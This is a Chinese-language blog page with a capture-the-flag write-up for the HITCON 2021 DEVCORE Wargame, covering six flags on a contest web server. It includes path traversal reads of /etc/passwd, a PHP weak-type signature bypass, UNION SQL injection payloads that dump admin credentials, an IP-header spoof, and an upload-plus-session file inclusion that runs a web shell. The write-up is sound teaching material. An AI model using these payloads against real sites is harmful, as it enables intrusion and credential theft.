<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HITCON 2021 DEVCORE Wargame Writeup | Gary Blog</title>
<meta name=keywords content="security,writeup"><meta name=description content="Flag 1
在首頁可以看到一張圖片，URL長成這樣。

http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=
其中 aHBfbTI4M2Zkdy5qcGc= 拿去 base64 deocde 會變成 hp_m283fdw.jpg ，發現是一個檔名，
這裡可以嘗試 path traversal。
嘗試讀取 ../../../../etc/passwd 成功，繼續嘗試讀取 source code。

先讀取 mount device ../../../../proc/mounts，嘗試找出 web root。

/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
接著讀取 /usr/share/nginx/frontend/index.php 可以發現首頁的 source code。

裡面有引入 include.php，讀取 include.php 後可以在裡面發現第一個 flag。

Flag 2
在 order.php 中，可以看到 sig 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 sig 驗證。
# order.php
require_once('include.php');

$id = get_get_param('id', '');
$sig = get_get_param('sig', '');

if (empty($id) || empty($sig)) {
    header('Location: /');
    exit();
}

$id = intval($id);
$pdo = get_pdo();
$res = $pdo->query('SELECT * FROM orders WHERE id = '.$id, PDO::FETCH_ASSOC);
$order = $res->fetch();

if (!$order) {
    $_SESSION['error_msg'] = '找不到此訂單';
    require_once('error.php');
}

$sig_hash = get_sig_hash($sig);
if ($sig_hash && $sig_hash != $order['sig_hash']) {
    $_SESSION['error_msg'] = '訂單網址參數錯誤';
    require_once('error.php');
}

switch ($order['status']) {
    case ORDER_STATUS_PICKING:
        $step = 1;
        break;
    case ORDER_STATUS_PACKING:
        $step = 2;
        break;
    case ORDER_STATUS_SENDING:
        $step = 3;
        break;
    case ORDER_STATUS_DELIVERING:
        $step = 4;
        break;
    case ORDER_STATUS_ARRIVED:
        $step = 5;
        break;
    case ORDER_STATUS_FINISH:
        $step = 6;
        break;
}
# include.php
function get_sig_hash($data) {
    $pdo = get_pdo();
    $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1&#34;, PDO::FETCH_ASSOC);
    $row = $res->fetch();
    if (!$row) {
        $secret = random_str(64);
        $pdo->exec(&#34;INSERT INTO options VALUES ('sig_secret', '&#34;.$secret.&#34;'), ('sig_algorithm', 'sha256')&#34;);
    } else {
        $secret = $row['value'];
    }
    $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1&#34;, PDO::FETCH_ASSOC);
    $algo = $res->fetch()['value'];
    return hash_hmac($algo, $data, $secret);
}
如果將 sig 以陣列的方式傳入 if ($sig_hash && $sig_hash != $order['sig_hash']) 結果會變成 if (NULL && NULL != &#34;abc&#34;) 恆為 False。"><meta name=author content="Gary Tan"><link rel=canonical href=https://blog.garytan.tw/posts/security/hitcon-2021-devcore-wargame-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=https://blog.garytan.tw/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.garytan.tw/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.garytan.tw/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.garytan.tw/apple-touch-icon.png><link rel=mask-icon href=https://blog.garytan.tw/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.garytan.tw/posts/security/hitcon-2021-devcore-wargame-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.garytan.tw/posts/security/hitcon-2021-devcore-wargame-writeup/"><meta property="og:site_name" content="Gary Blog"><meta property="og:title" content="HITCON 2021 DEVCORE Wargame Writeup"><meta property="og:description" content="Flag 1 在首頁可以看到一張圖片，URL長成這樣。
http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=
其中 aHBfbTI4M2Zkdy5qcGc= 拿去 base64 deocde 會變成 hp_m283fdw.jpg ，發現是一個檔名， 這裡可以嘗試 path traversal。
嘗試讀取 ../../../../etc/passwd 成功，繼續嘗試讀取 source code。
先讀取 mount device ../../../../proc/mounts，嘗試找出 web root。
/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 接著讀取 /usr/share/nginx/frontend/index.php 可以發現首頁的 source code。
裡面有引入 include.php，讀取 include.php 後可以在裡面發現第一個 flag。
Flag 2 在 order.php 中，可以看到 sig 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 sig 驗證。
# order.php require_once('include.php'); $id = get_get_param('id', ''); $sig = get_get_param('sig', ''); if (empty($id) || empty($sig)) { header('Location: /'); exit(); } $id = intval($id); $pdo = get_pdo(); $res = $pdo->query('SELECT * FROM orders WHERE id = '.$id, PDO::FETCH_ASSOC); $order = $res->fetch(); if (!$order) { $_SESSION['error_msg'] = '找不到此訂單'; require_once('error.php'); } $sig_hash = get_sig_hash($sig); if ($sig_hash && $sig_hash != $order['sig_hash']) { $_SESSION['error_msg'] = '訂單網址參數錯誤'; require_once('error.php'); } switch ($order['status']) { case ORDER_STATUS_PICKING: $step = 1; break; case ORDER_STATUS_PACKING: $step = 2; break; case ORDER_STATUS_SENDING: $step = 3; break; case ORDER_STATUS_DELIVERING: $step = 4; break; case ORDER_STATUS_ARRIVED: $step = 5; break; case ORDER_STATUS_FINISH: $step = 6; break; } # include.php function get_sig_hash($data) { $pdo = get_pdo(); $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1&#34;, PDO::FETCH_ASSOC); $row = $res->fetch(); if (!$row) { $secret = random_str(64); $pdo->exec(&#34;INSERT INTO options VALUES ('sig_secret', '&#34;.$secret.&#34;'), ('sig_algorithm', 'sha256')&#34;); } else { $secret = $row['value']; } $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1&#34;, PDO::FETCH_ASSOC); $algo = $res->fetch()['value']; return hash_hmac($algo, $data, $secret); } 如果將 sig 以陣列的方式傳入 if ($sig_hash && $sig_hash != $order['sig_hash']) 結果會變成 if (NULL && NULL != &#34;abc&#34;) 恆為 False。"><meta property="og:locale" content="zh-tw"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-11-30T22:19:10+08:00"><meta property="article:modified_time" content="2021-11-30T22:19:10+08:00"><meta property="article:tag" content="Security"><meta property="article:tag" content="Writeup"><meta name=twitter:card content="summary"><meta name=twitter:title content="HITCON 2021 DEVCORE Wargame Writeup"><meta name=twitter:description content="Flag 1
在首頁可以看到一張圖片，URL長成這樣。

http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=
其中 aHBfbTI4M2Zkdy5qcGc= 拿去 base64 deocde 會變成 hp_m283fdw.jpg ，發現是一個檔名，
這裡可以嘗試 path traversal。
嘗試讀取 ../../../../etc/passwd 成功，繼續嘗試讀取 source code。

先讀取 mount device ../../../../proc/mounts，嘗試找出 web root。

/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
接著讀取 /usr/share/nginx/frontend/index.php 可以發現首頁的 source code。

裡面有引入 include.php，讀取 include.php 後可以在裡面發現第一個 flag。

Flag 2
在 order.php 中，可以看到 sig 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 sig 驗證。
# order.php
require_once('include.php');

$id = get_get_param('id', '');
$sig = get_get_param('sig', '');

if (empty($id) || empty($sig)) {
    header('Location: /');
    exit();
}

$id = intval($id);
$pdo = get_pdo();
$res = $pdo->query('SELECT * FROM orders WHERE id = '.$id, PDO::FETCH_ASSOC);
$order = $res->fetch();

if (!$order) {
    $_SESSION['error_msg'] = '找不到此訂單';
    require_once('error.php');
}

$sig_hash = get_sig_hash($sig);
if ($sig_hash && $sig_hash != $order['sig_hash']) {
    $_SESSION['error_msg'] = '訂單網址參數錯誤';
    require_once('error.php');
}

switch ($order['status']) {
    case ORDER_STATUS_PICKING:
        $step = 1;
        break;
    case ORDER_STATUS_PACKING:
        $step = 2;
        break;
    case ORDER_STATUS_SENDING:
        $step = 3;
        break;
    case ORDER_STATUS_DELIVERING:
        $step = 4;
        break;
    case ORDER_STATUS_ARRIVED:
        $step = 5;
        break;
    case ORDER_STATUS_FINISH:
        $step = 6;
        break;
}
# include.php
function get_sig_hash($data) {
    $pdo = get_pdo();
    $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1&#34;, PDO::FETCH_ASSOC);
    $row = $res->fetch();
    if (!$row) {
        $secret = random_str(64);
        $pdo->exec(&#34;INSERT INTO options VALUES ('sig_secret', '&#34;.$secret.&#34;'), ('sig_algorithm', 'sha256')&#34;);
    } else {
        $secret = $row['value'];
    }
    $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1&#34;, PDO::FETCH_ASSOC);
    $algo = $res->fetch()['value'];
    return hash_hmac($algo, $data, $secret);
}
如果將 sig 以陣列的方式傳入 if ($sig_hash && $sig_hash != $order['sig_hash']) 結果會變成 if (NULL && NULL != &#34;abc&#34;) 恆為 False。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.garytan.tw/posts/"},{"@type":"ListItem","position":2,"name":"HITCON 2021 DEVCORE Wargame Writeup","item":"https://blog.garytan.tw/posts/security/hitcon-2021-devcore-wargame-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HITCON 2021 DEVCORE Wargame Writeup","name":"HITCON 2021 DEVCORE Wargame Writeup","description":"Flag 1 在首頁可以看到一張圖片，URL長成這樣。\nhttp://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=\n其中 aHBfbTI4M2Zkdy5qcGc= 拿去 base64 deocde 會變成 hp_m283fdw.jpg ，發現是一個檔名， 這裡可以嘗試 path traversal。\n嘗試讀取 ../../../../etc/passwd 成功，繼續嘗試讀取 source code。\n先讀取 mount device ../../../../proc/mounts，嘗試找出 web root。\n/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 接著讀取 /usr/share/nginx/frontend/index.php 可以發現首頁的 source code。\n裡面有引入 include.php，讀取 include.php 後可以在裡面發現第一個 flag。\nFlag 2 在 order.php 中，可以看到 sig 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 sig 驗證。\n# order.php require_once(\u0026#39;include.php\u0026#39;); $id = get_get_param(\u0026#39;id\u0026#39;, \u0026#39;\u0026#39;); $sig = get_get_param(\u0026#39;sig\u0026#39;, \u0026#39;\u0026#39;); if (empty($id) || empty($sig)) { header(\u0026#39;Location: /\u0026#39;); exit(); } $id = intval($id); $pdo = get_pdo(); $res = $pdo-\u0026gt;query(\u0026#39;SELECT * FROM orders WHERE id = \u0026#39;.$id, PDO::FETCH_ASSOC); $order = $res-\u0026gt;fetch(); if (!$order) { $_SESSION[\u0026#39;error_msg\u0026#39;] = \u0026#39;找不到此訂單\u0026#39;; require_once(\u0026#39;error.php\u0026#39;); } $sig_hash = get_sig_hash($sig); if ($sig_hash \u0026amp;\u0026amp; $sig_hash != $order[\u0026#39;sig_hash\u0026#39;]) { $_SESSION[\u0026#39;error_msg\u0026#39;] = \u0026#39;訂單網址參數錯誤\u0026#39;; require_once(\u0026#39;error.php\u0026#39;); } switch ($order[\u0026#39;status\u0026#39;]) { case ORDER_STATUS_PICKING: $step = 1; break; case ORDER_STATUS_PACKING: $step = 2; break; case ORDER_STATUS_SENDING: $step = 3; break; case ORDER_STATUS_DELIVERING: $step = 4; break; case ORDER_STATUS_ARRIVED: $step = 5; break; case ORDER_STATUS_FINISH: $step = 6; break; } # include.php function get_sig_hash($data) { $pdo = get_pdo(); $res = $pdo-\u0026gt;query(\u0026#34;SELECT `value` FROM options WHERE `key` = \u0026#39;sig_secret\u0026#39; LIMIT 1\u0026#34;, PDO::FETCH_ASSOC); $row = $res-\u0026gt;fetch(); if (!$row) { $secret = random_str(64); $pdo-\u0026gt;exec(\u0026#34;INSERT INTO options VALUES (\u0026#39;sig_secret\u0026#39;, \u0026#39;\u0026#34;.$secret.\u0026#34;\u0026#39;), (\u0026#39;sig_algorithm\u0026#39;, \u0026#39;sha256\u0026#39;)\u0026#34;); } else { $secret = $row[\u0026#39;value\u0026#39;]; } $res = $pdo-\u0026gt;query(\u0026#34;SELECT `value` FROM options WHERE `key` = \u0026#39;sig_algorithm\u0026#39; LIMIT 1\u0026#34;, PDO::FETCH_ASSOC); $algo = $res-\u0026gt;fetch()[\u0026#39;value\u0026#39;]; return hash_hmac($algo, $data, $secret); } 如果將 sig 以陣列的方式傳入 if ($sig_hash \u0026amp;\u0026amp; $sig_hash != $order['sig_hash']) 結果會變成 if (NULL \u0026amp;\u0026amp; NULL != \u0026quot;abc\u0026quot;) 恆為 False。\n","keywords":["security","writeup"],"articleBody":"Flag 1 在首頁可以看到一張圖片，URL長成這樣。\nhttp://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=\n其中 aHBfbTI4M2Zkdy5qcGc= 拿去 base64 deocde 會變成 hp_m283fdw.jpg ，發現是一個檔名， 這裡可以嘗試 path traversal。\n嘗試讀取 ../../../../etc/passwd 成功，繼續嘗試讀取 source code。\n先讀取 mount device ../../../../proc/mounts，嘗試找出 web root。\n/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 接著讀取 /usr/share/nginx/frontend/index.php 可以發現首頁的 source code。\n裡面有引入 include.php，讀取 include.php 後可以在裡面發現第一個 flag。\nFlag 2 在 order.php 中，可以看到 sig 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 sig 驗證。\n# order.php require_once('include.php'); $id = get_get_param('id', ''); $sig = get_get_param('sig', ''); if (empty($id) || empty($sig)) { header('Location: /'); exit(); } $id = intval($id); $pdo = get_pdo(); $res = $pdo-\u003equery('SELECT * FROM orders WHERE id = '.$id, PDO::FETCH_ASSOC); $order = $res-\u003efetch(); if (!$order) { $_SESSION['error_msg'] = '找不到此訂單'; require_once('error.php'); } $sig_hash = get_sig_hash($sig); if ($sig_hash \u0026\u0026 $sig_hash != $order['sig_hash']) { $_SESSION['error_msg'] = '訂單網址參數錯誤'; require_once('error.php'); } switch ($order['status']) { case ORDER_STATUS_PICKING: $step = 1; break; case ORDER_STATUS_PACKING: $step = 2; break; case ORDER_STATUS_SENDING: $step = 3; break; case ORDER_STATUS_DELIVERING: $step = 4; break; case ORDER_STATUS_ARRIVED: $step = 5; break; case ORDER_STATUS_FINISH: $step = 6; break; } # include.php function get_sig_hash($data) { $pdo = get_pdo(); $res = $pdo-\u003equery(\"SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1\", PDO::FETCH_ASSOC); $row = $res-\u003efetch(); if (!$row) { $secret = random_str(64); $pdo-\u003eexec(\"INSERT INTO options VALUES ('sig_secret', '\".$secret.\"'), ('sig_algorithm', 'sha256')\"); } else { $secret = $row['value']; } $res = $pdo-\u003equery(\"SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1\", PDO::FETCH_ASSOC); $algo = $res-\u003efetch()['value']; return hash_hmac($algo, $data, $secret); } 如果將 sig 以陣列的方式傳入 if ($sig_hash \u0026\u0026 $sig_hash != $order['sig_hash']) 結果會變成 if (NULL \u0026\u0026 NULL != \"abc\") 恆為 False。\n所以只要將 sig= 改為 sig[]= 就可以任意讀取訂單內容。\n在網址輸入 http://web.ctf.devcore.tw/order.php?id=1\u0026sig[]= 即可獲得第二個 flag。\nFlag 3 在 print.php 可以發現裡面有一個可以 SQL injection 的注入點。\n\u003c?php require_once('include.php'); require_once('third_party/vendor/autoload.php'); //require_once('rate_limit.php'); // rate limit is not working, use random sleep as a workaround sleep(random_int(0, 2)); $is_from_print = true; $id = get_get_param('id', ''); $sig = get_get_param('sig', ''); $sig_hash = get_sig_hash($sig); $pdo = get_pdo(); $res = $pdo-\u003equery(\" SELECT * FROM orders WHERE sig_hash = '$sig_hash' AND id = $id LIMIT 1 \", PDO::FETCH_ASSOC); try { $order = $res-\u003efetch(); } catch (Error $e) { $order = []; } ob_start(); include('pdf.php'); $html = ob_get_clean(); $mpdf = new \\Mpdf\\Mpdf([ 'tempDir' =\u003e '/tmp', 'autoScriptToLang' =\u003e true, 'autoLangToFont' =\u003e true, 'mode' =\u003e 'utf-8' ]); $mpdf-\u003eSetTitle('收據明細'); $mpdf-\u003eSetSubject('收據明細'); $mpdf-\u003eSetAuthor(random_str((random_int(1, 256)))); $mpdf-\u003eSetCreator(random_str((random_int(1, 256)))); $mpdf-\u003eWriteHTML($html); $mpdf-\u003eOutput(); 先在 id 中注入 -1 or 1=1 -- 測試弱點是否成立。\n可以成功找到第一筆訂單。\n並使用 UNION 看看有哪幾個欄位可以被利用。\n插入 -1 UNION SELECT 1,2,3,4,5,6,7,8,9 -- 而在 /usr/share/nginx/b8ck3nd/login.php 裡面可以找到儲存後台帳號密碼的資料表名稱 backend_users\n並利用 SQL injection 找出 backend_users 有哪些欄位。\n插入 -1 UNION SELECT GROUP_CONCAT(column_name SEPARATOR ','),2,3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name='backend_users' -- 後得到 id,username,password,description\n得到欄位後，即可取得後台帳號密碼。 -1 UNION SELECT username,password,description,4,5,6,7,8,9 FROM backend_users -- 並可以在 Description 中取得第三個 flag。\nFlag 4 在嘗試進入後台頁面 http://web.ctf.devcore.tw/b8ck3nd/ 時，會被 redirect 回首頁。\n利用 path traversal 查看 /usr/share/nginx/b8ck3nd/include.php，發現後台的頁面會驗證來源 IP，若來源 IP 不是 127.0.0.1 或 172.18.11.89，則會 redirect 回首頁。\n\u003c?php require_once('../frontend/include.php'); session_start_once(); if (!in_array(get_client_ip(), ['127.0.0.1', '172.18.11.89'], true)) { header('Location: /'); exit(); } if (!isset($_SESSION['user_id'])) { if (!endsWith($_SERVER['SCRIPT_FILENAME'], 'login.php')) { header('Location: /b8ck3nd/login.php'); exit(); } } # ../frontend/include.php function get_client_ip() { if (!empty($_SERVER['HTTP_CLIENT_IP'])) { $ip = $_SERVER['HTTP_CLIENT_IP']; } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip = $_SERVER['REMOTE_ADDR']; } return $ip; } 但可以發現驗證 IP 來源是參考 HTTP header 的內容，只要在 header 中加入 CLIENT-IP、X-FORWARDED-FOR、REMOTE-ADDR 即可繞過其限制。詳細可以參考 如何正確的取得使用者 IP？ | DEVCORE 戴夫寇爾\n並且可以使用剛剛 SQL injection 取得的帳號密碼 admin/u=479_p5jV:Fsq(2 進行登入。\n登入後即可取得第四個 flag。\nFlag 5 在上傳的功能中可以發現如果在 POST 封包中，若有參數 rename 、 folder 即可控制上傳檔案的檔案名稱以及路徑，並且未有任何限制。\n\u003c?php require_once('include.php'); if ($_SERVER['REQUEST_METHOD'] == 'GET') { header('Content-Type: text/plain'); echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk'; exit(); } if (isset($_FILES['file']) \u0026\u0026 is_uploaded_file($_FILES['file']['tmp_name'])) { header('Content-Type: application/json; charset=utf-8'); $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filename = random_str(32).'.'.$ext; if (isset($_POST['rename'])) { $filename = $_POST['rename']; } if (isset($_POST['folder'])) { $folder = $_POST['folder']; if (!file_exists(IMAGE_PATH.$folder)) { mkdir(IMAGE_PATH.$folder); } $filename = $folder.'/'.$filename; } $filepath = IMAGE_PATH . $filename; move_uploaded_file($_FILES['file']['tmp_name'], $filepath); system(\"rsync_wrap \".escapeshellarg($filepath)); $id = base64_urlsafe_encode($filename); echo json_encode([ 'default' =\u003e '/image.php?id='.$id ]); } else { http_response_code(400); } 只要在 folder 中含有 /../ 即可出現第五個 flag。\nFlag 6 最後一個 flag 要想辦法上傳 shell，但因 nginx 可以瀏覽的路徑都是 mount 成 ro 無法直接上傳 web shell。\n# /proc/mounts /dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 可以在 /usr/share/nginx/frontend/include.php 裡面發現一段語系切換的功能。\n# frontend/include.php if (!isset($_SESSION['lang'])) { $_SESSION['lang'] = DEFAULT_LANGUAGE; } require_once('langs/' . $_SESSION['lang'] . '.php'); 這裡會將 session 中的 lang 值當成語系檔案引入進來，且並未做任何驗證，只要在 lang 中填入任意路徑即可達成 local file inclusion 弱點，執行 web shell。\n先在 /usr/share/nginx/images/ 中上傳我們要被引入的 web shell。\nPHP 的 session 值會存在於 /tmp/sess_。 所以只要上傳 lang|s:18:\"../../images/shell\"; 至 /tmp/sess_，就可以將 session 中的 lang 值更改成 ../../images/shell，進而執行 web shell。\n根目錄裡有一個 /readflag 執行後即可得到第六個 flag。\n","wordCount":"703","inLanguage":"en","datePublished":"2021-11-30T22:19:10+08:00","dateModified":"2021-11-30T22:19:10+08:00","author":{"@type":"Person","name":"Gary Tan"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.garytan.tw/posts/security/hitcon-2021-devcore-wargame-writeup/"},"publisher":{"@type":"Organization","name":"Gary Blog","logo":{"@type":"ImageObject","url":"https://blog.garytan.tw/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.garytan.tw/ accesskey=h title="Gary Blog (Alt + H)">Gary Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.garytan.tw/archives/ title=archives><span>archives</span></a></li><li><a href=https://blog.garytan.tw/categories/ title=categories><span>categories</span></a></li><li><a href=https://blog.garytan.tw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.garytan.tw/>Home</a>&nbsp;»&nbsp;<a href=https://blog.garytan.tw/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HITCON 2021 DEVCORE Wargame Writeup</h1><div class=post-meta><span title='2021-11-30 22:19:10 +0800 CST'>2021-11-30</span>&nbsp;·&nbsp;Gary Tan</div></header><div class=post-content><h2 id=flag-1>Flag 1<a hidden class=anchor aria-hidden=true href=#flag-1>#</a></h2><p>在首頁可以看到一張圖片，URL長成這樣。</p><p><img alt=pic loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/pic.png></p><p><code>http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=</code></p><p>其中 <code>aHBfbTI4M2Zkdy5qcGc=</code> 拿去 base64 deocde 會變成 <code>hp_m283fdw.jpg</code> ，發現是一個檔名，
這裡可以嘗試 path traversal。</p><p>嘗試讀取 <code>../../../../etc/passwd</code> 成功，繼續嘗試讀取 source code。</p><p><img alt=etc_passwd loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/etc_passwd.png></p><p>先讀取 mount device <code>../../../../proc/mounts</code>，嘗試找出 web root。</p><p><img alt=proc_mounts loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/proc_mounts.png></p><pre tabindex=0><code>/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
</code></pre><p>接著讀取 <code>/usr/share/nginx/frontend/index.php</code> 可以發現首頁的 source code。</p><p><img alt=frontend_index loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/frontend_index.png></p><p>裡面有引入 <code>include.php</code>，讀取 <code>include.php</code> 後可以在裡面發現第一個 flag。</p><p><img alt=frontend_include loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/frontend_include.png></p><h2 id=flag-2>Flag 2<a hidden class=anchor aria-hidden=true href=#flag-2>#</a></h2><p>在 <code>order.php</code> 中，可以看到 <code>sig</code> 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 <code>sig</code> 驗證。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># order.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;include.php&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;id&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
</span></span><span style=display:flex><span>$sig <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;sig&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>empty</span>($id) <span style=color:#f92672>||</span> <span style=color:#66d9ef>empty</span>($sig)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>intval</span>($id);
</span></span><span style=display:flex><span>$pdo <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_pdo</span>();
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#39;SELECT * FROM orders WHERE id = &#39;</span><span style=color:#f92672>.</span>$id, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
</span></span><span style=display:flex><span>$order <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$order) {
